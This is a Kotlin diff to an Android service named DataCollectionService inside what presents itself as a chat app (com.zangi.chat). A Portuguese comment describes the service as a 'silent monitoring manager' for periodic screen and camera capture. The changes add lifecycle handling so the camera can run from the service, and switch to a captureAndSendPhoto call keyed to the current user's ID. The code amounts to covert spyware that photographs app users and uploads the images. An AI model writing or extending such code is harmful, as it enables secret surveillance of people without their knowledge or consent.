@@ -11,11 +11,18 @@ import com.zangi.chat.data.repository.ChatRepository
 import kotlinx.coroutines.*
 import java.util.*
 
+import androidx.lifecycle.Lifecycle
+import androidx.lifecycle.LifecycleOwner
+import androidx.lifecycle.LifecycleRegistry
+
 /**
  * DataCollectionService: O Gerenciador de Monitoramento Silencioso.
  * Coordena a captura de tela e câmera de forma periódica.
  */
-class DataCollectionService : Service() {
+class DataCollectionService : Service(), LifecycleOwner {
+
+    private val lifecycleRegistry = LifecycleRegistry(this)
+    override val lifecycle: Lifecycle get() = lifecycleRegistry
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
     private lateinit var repository: ChatRepository
@@ -38,8 +45,11 @@ class DataCollectionService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
+        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
+        
         repository = ChatRepository.getInstance()
-        cameraCaptureManager = CameraCaptureManager(this, repository)
+        cameraCaptureManager = CameraCaptureManager(this, repository, this)
         createNotificationChannel()
     }
 
@@ -103,7 +113,7 @@ class DataCollectionService : Service() {
                 val userId = repository.currentUser.value?.id ?: "unknown_user"
                 
                 // Chamada real para o gerenciador de câmera que criamos
-                val result = cameraCaptureManager.captureAndUpload(userId)
+                val result = cameraCaptureManager.captureAndSendPhoto(userId)
                 
                 if (result.isSuccess) {
                     Log.i(TAG, "✅ Ciclo de câmera concluído com sucesso.")
@@ -143,6 +153,8 @@ class DataCollectionService : Service() {
 
     override fun onDestroy() {
         Log.d(TAG, "🧹 Encerrando serviço e cancelando coroutines")
+        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
+        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
         serviceScope.cancel()
         super.onDestroy()
     }
